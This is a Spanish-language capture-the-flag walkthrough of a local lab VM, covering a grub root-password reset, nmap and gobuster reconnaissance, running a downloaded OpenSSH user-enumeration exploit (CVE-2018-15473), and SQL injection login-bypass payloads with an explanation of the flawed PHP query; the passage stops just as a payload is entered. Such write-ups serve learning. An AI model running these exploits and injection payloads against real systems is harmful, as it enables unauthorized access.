
	Esta maquina es lograda para VirtualBox, pero como usamos VMware, pues hacemos cambios. En el grub inyectamos `init=/bin/bash`, cambiamos la contraseña de root y especificamos la ip. En este caso la interfaz de red que nos interesa es `ens33` y  procedemos con las siguientes líneas.
	
	ifconfig ens33 192.168.0.77 netmask 255.255.255.0
	route add default gw 192.168.0.1
	
	Aunque no es necesario, la configuración resultante no resuelve salida a internet, pero se puede corregir editando /etc/resolv.conf cambiando nameserver por 8.8.8.8 

Tenemos la IP detectada `192.168.0.77`
`$sudo arp-scan -I wlp2s0 --localnet`
``` java
[sudo] contraseña para kmxbay: 
Interface: wlp2s0, type: EN10MB, MAC: d8:fc:93:53:a7:cd, IPv4: 192.168.0.21
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1	    24:e4:ce:b3:4a:16	(Unknown)
[...]
192.168.0.77	00:0c:29:50:ee:23	VMware, Inc.
```

Con el comando ping obtenemos la siguiente información:
```java
64 bytes from 192.168.0.77: icmp_seq=1 ttl=64 time=19.0 ms
```

Obtenemos posibles puertos objetivo con:
`sudo nmap -p- -sS --min-rate 5000 -n -Pn  192.168.0.77`
```java
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
2375/tcp filtered docker
```

Obteniendo información:
`sudo nmap -p22,80,2375 -sSCV 192.168.0.77`
```java
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:c6:49:ce:9b:54:7f:57:6d:56:b3:0a:30:47:83:b4 (RSA)
|   256 73:86:8d:97:2e:60:08:8a:76:24:3c:94:72:8f:70:f7 (ECDSA)
|_  256 26:48:91:66:85:a2:39:99:f5:9b:62:da:f9:87:4a:e6 (ED25519)
80/tcp   open     http    nginx 1.17.4
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.17.4
|_http-title: Login
2375/tcp filtered docker

```

Vía Launchpad, encontramos que el sistema operativo es Ubuntu Bionic.
Revisando vulnerabilidad en ssh, encontramos algunos exploits:
```java
$searchsploit ssh user enumeration
------------------------------------------------- -------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- -------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration         | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)   | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration             | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)             | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration            | linux/remote/40113.txt
------------------------------------------------- -------------------------------
```

Obtenemos el exploit escogido y lo renombramos a `UserEnumeration22.py`
`$searchsploit -m linux/remote/45939.py`
```java
  Exploit: OpenSSH < 7.7 - User Enumeration (2)
      URL: https://www.exploit-db.com/exploits/45939
     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
    Codes: CVE-2018-15473
 Verified: False
File Type: Python script, ASCII text executable
```
`$mv 45939.py UserEnumeration22.py`
Como en el script vemos esta línea: `#!/usr/bin/env python2.7`, tendremos que resolver la ejecución de python2.7 en un entorno con python3. para esto con pyenv podemos instalar estas dependencias:
```bash
sudo apt install -y make build-essential libssl-dev zlib1g-dev \
libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \
libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev \
libffi-dev liblzma-dev
```
Para pyenv, ejecutamos el código de https://pyenv.run.
En la terminal que trabajamos agregamos esta líneas al PATH  y aplicamos los cambios:
```python
export PATH="$HOME/.pyenv/bin:$PATH"
eval "$(pyenv init --path)"
eval "$(pyenv init -)"
eval "$(pyenv virtualenv-init -)"

source ~/.bashrc
```
Instalamos python2.7:
`pyenv install 2.7.18 && pyenv global 2.7.18`

De aquí sólo se tendrá que instalar paramiko con `pip2 install paramiko` y ejecutamos con los argumentos requeridos,validando el usuario root existe:
```python
$./UserEnumeration22.py 192.168.0.77 root 2>/dev/null
[+] root is a valid username
```
Pero antes de avanzar, notamos que cualquier valor de usuario parece ser válido:
```java
$./UserEnumeration22.py 192.168.0.77 tumama 2>/dev/null
[+] tumama is a valid username
```

Del lado del sitio web:
`$whatweb http://192.168.0.77/`
```python
http://192.168.0.77/ [200 OK] Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.17.4], IP[192.168.0.77], PHP[7.2.7], PasswordField[password], Title[Login], X-Powered-By[PHP/7.2.7], nginx[1.17.4]
```

Encontramos varios directorios con `gobuster` y el diccionario `directory-list-2.3-medium.txt`:
`$gobuster dir -u http://192.168.0.77/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,html,sh,txt`
```java
/.html                (Status: 403) [Size: 214]
/login.php            (Status: 200) [Size: 1303]
/changelog.txt        (Status: 200) [Size: 242]
/phpinfo.php          (Status: 200) [Size: 86117]
```

Explorando el sitio, vemos un login de un aparente banco el cual no fue vulnerable a credenciales débiles, pero sí a SQLi. Esto se descubrió al interceptar con BurpSuite, con la línea `user='+or1=1--+-&password='+or1=1--+-&s=Login` en el request, el código nos devuelve este mensaje:
![[Pasted image 20250407145704.png]]
Esto último quiere decir que: el código intenta contar filas de un resultado SQL, pero en lugar de ser una consulta válida, devolvió un false. 
Así es! en otras palabras indica que el input se está metiendo en una consulta SQL sin validación, es decir, una clásica SQLi.
Explicación rápida:
Probablemente en la línea 16, existe algo como:
```php
$result = mysqli_query($conn, "SELECT * FROM users WHERE username = '$user' AND password = '$pass'");
if (mysqli_num_rows($result) > 0) { ... }
```
La inyección, rompe el flujo de esta manera:
```sql
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''
```
Provocando que `mysqli_query()` de un `false` y que `mysqli_num_rows` un warning.

Regresamos a la versión web, teniendo un poco más idea de como se compone nuestro sitio web e inyectamos un payload que pueda funcionar, como `tumama' OR 1=1#`:
